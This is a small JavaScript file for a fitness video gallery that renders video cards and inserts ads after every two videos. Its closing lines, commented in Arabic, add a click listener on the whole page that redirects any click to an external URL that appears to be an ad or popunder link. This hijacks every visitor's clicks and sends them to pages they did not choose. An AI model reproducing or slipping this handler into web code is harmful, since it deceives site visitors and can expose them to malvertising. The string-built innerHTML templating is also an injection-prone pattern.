// Array to store video data
let videoList = [
    { title: "Leg Day Workout", src: "lv_0_20241119034905.mp4" },
    { title: "Best Glute Exercises", src: "lv_0_20241119040806.mp4" },
    { title: "Full-Body Stretch Routine", src: "lv_0_20241119041822.mp4" },
];

// Function to render videos and ads
function renderVideos() {
    const videoContainer = document.getElementById("video-list");
    videoContainer.innerHTML = ""; // Clear existing content

    videoList.forEach((video, index) => {
        const videoCard = `
            <div class="reel-card">
                <video controls>
                    <source src="${video.src}" type="video/mp4">
                    Your browser does not support the video tag.
                </video>
                <p>${video.title}</p>
            </div>`;

        videoContainer.innerHTML += videoCard;

        // Insert an ad after every 2 videos
        if ((index + 1) % 2 === 0) {
            const ad = document.getElementById("ad-placeholder").innerHTML;
            videoContainer.innerHTML += ad;
        }
    });
}

// Initial render of videos
renderVideos();
  // إضافة مستمع الحدث عند النقر على الصفحة
  document.body.addEventListener('click', function() {
    // التوجيه إلى صفحة جديدة عند النقر
    window.location.href = "https://luglawhaulsano.net/4/8456112";  // استبدل الرابط هنا
  });
